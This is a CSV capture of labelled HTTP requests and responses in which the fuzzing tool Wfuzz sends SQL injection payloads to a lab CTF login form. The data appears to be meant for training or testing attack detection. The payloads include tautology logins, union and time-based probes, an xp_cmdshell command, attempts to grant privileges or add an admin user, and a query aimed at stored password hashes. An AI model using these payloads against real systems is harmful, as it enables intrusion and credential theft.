attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Connection,req_header_Content_Length,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
sql,192.168.1.39,80,username='; exec master..xp_cmdshell 'ping 10.10.1.2'--&password=admin123&submit=submit,*/*,,87,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56527
sql,192.168.1.39,80,username=' grant connect to name; grant resource to name; --&password=admin123&submit=submit,*/*,,92,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'grant connect to name; grant resource to name; --' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,618,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56525
sql,192.168.1.39,80,username='); --&password=admin123&submit=submit,*/*,,47,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '); --' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,574,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56526
sql,192.168.1.39,80,username=' or 1=1 --&password=admin123&submit=submit,*/*,,52,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,551,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56528
sql,192.168.1.39,80,"username=' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --&password=admin123&submit=submit",*/*,,110,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,571,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56529
sql,192.168.1.39,80,"username=' union (select NULL, NULL, NULL, NULL,  (select @@version)) --&password=admin123&submit=submit",*/*,,104,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,571,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56530
sql,192.168.1.39,80,"username=' union (select NULL, NULL, NULL,  (select @@version)) --&password=admin123&submit=submit",*/*,,98,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,571,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56531
sql,192.168.1.39,80,"username=' union (select NULL, NULL, (select @@version)) --&password=admin123&submit=submit",*/*,,91,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,571,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56532
sql,192.168.1.39,80,"username=' union (select NULL, (select @@version)) --&password=admin123&submit=submit",*/*,,85,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,571,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56533
sql,192.168.1.39,80,username='; --&password=admin123&submit=submit,*/*,,46,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:48 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56534
sql,192.168.1.39,80,username='; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --&password=admin123&submit=submit,*/*,,104,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:56 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56540
sql,192.168.1.39,80,username='; if not((select serverproperty('isintegratedsecurityonly')) <> 0) waitfor delay '0:0:2' --&password=admin123&submit=submit,*/*,,133,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:56 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56541
sql,192.168.1.39,80,"username='; if not(substring((select @@version),25,1) <> 5) waitfor delay '0:0:2' --&password=admin123&submit=submit",*/*,,116,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:56 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56542
sql,192.168.1.39,80,"username='; if not(substring((select @@version),24,1) <> 1) waitfor delay '0:0:2' --&password=admin123&submit=submit",*/*,,116,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:56 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56543
sql,192.168.1.39,80,username='; if not(select system_user) <> 'sa' waitfor delay '0:0:2' --&password=admin123&submit=submit,*/*,,103,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:56 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56544
sql,192.168.1.39,80,"username='; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --&password=admin123&submit=submit",*/*,,116,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:56 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56537
sql,192.168.1.39,80,"username='; if not(substring((select @@version),25,1) <> 8) waitfor delay '0:0:2' --&password=admin123&submit=submit",*/*,,116,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:56 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56538
sql,192.168.1.39,80,username='; if not((select serverproperty('isintegratedsecurityonly')) <> 1) waitfor delay '0:0:2' --&password=admin123&submit=submit,*/*,,133,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:30:56 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56539
sql,192.168.1.39,80,"username=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i&password=admin123&submit=submit",*/*,,204,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,622,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56551
sql,192.168.1.39,80,"username=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i&password=admin123&submit=submit",*/*,,236,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,622,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56552
sql,192.168.1.39,80,username=' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i&password=admin123&submit=submit,*/*,,122,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1305 FUNCTION utl_inaddr.get_host_address does not exist in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,447,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56553
sql,192.168.1.39,80,username=' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i&password=admin123&submit=submit,*/*,,123,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'cscc_sqli1.v$instance' doesn't exist in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,435,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56554
sql,192.168.1.39,80,username=' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i&password=admin123&submit=submit,*/*,,134,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42S02]: Base table or view not found: 1146 Table 'cscc_sqli1.v$version' doesn't exist in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,434,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56555
sql,192.168.1.39,80,username=' or '1'='1&password=admin123&submit=submit,*/*,,52,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56556
sql,192.168.1.39,80,"username=' || myappadmin.adduser('admin', 'newpass') || '&password=admin123&submit=submit",*/*,,89,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1305 FUNCTION myappadmin.adduser does not exist in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,438,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56557
sql,192.168.1.39,80,"username=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i&password=admin123&submit=submit",*/*,,195,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,617,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56558
sql,192.168.1.39,80,"username=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i&password=admin123&submit=submit",*/*,,207,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i' AND password = 'admin123' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,622,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:19 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56559
sql,192.168.1.39,80,username=uni/**/on sel/**/ect&password=admin123&submit=submit,*/*,,61,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56564
sql,192.168.1.39,80,username=@variable&password=admin123&submit=submit,*/*,,50,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56566
sql,192.168.1.39,80,username=@var select @var as var into temp end --&password=admin123&submit=submit,*/*,,81,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56565
sql,192.168.1.39,80,"username=,@variable&password=admin123&submit=submit",*/*,,51,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56567
sql,192.168.1.39,80,username='||UTL_HTTP.REQUEST&password=admin123&submit=submit,*/*,,60,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,<br /> <b>Fatal error</b>:  Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' AND password = 'admin123'' at line 1 in /var/www/html/vuln/web/chall2/index.php:35 Stack trace: #0 /var/www/html/vuln/web/chall2/index.php(35): PDOStatement-&gt;execute() #1 /var/www/html/vuln/web/chall2/index.php(48): checkLogin() #2 {main}   thrown in <b>/var/www/html/vuln/web/chall2/index.php</b> on line <b>35</b><br /> ,,569,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56568
sql,192.168.1.39,80,username=update&password=admin123&submit=submit,*/*,,47,application/x-www-form-urlencoded,192.168.1.39,Wfuzz/3.1.0,POST,http://192.168.1.39/vuln/web/chall2/index.php,"INVALID LOGIN <!DOCTYPE html> <html> <head>  <title>csccCTF - chall2</title> </head> <body>  <form method=""POST"" action=""index.php"">   <input type=""username"" name=""username"" placeholder=""username"">   <input type=""password"" name=""password"" placeholder=""password"">   <input type=""submit"" name=""submit"" value=""submit"">  </form> </body> </html> ",,341,text/html; charset=UTF-8,"Mon, 30 Jan 2023 23:31:37 GMT",200,Apache/2.4.52 (Ubuntu),192.168.1.34,56569
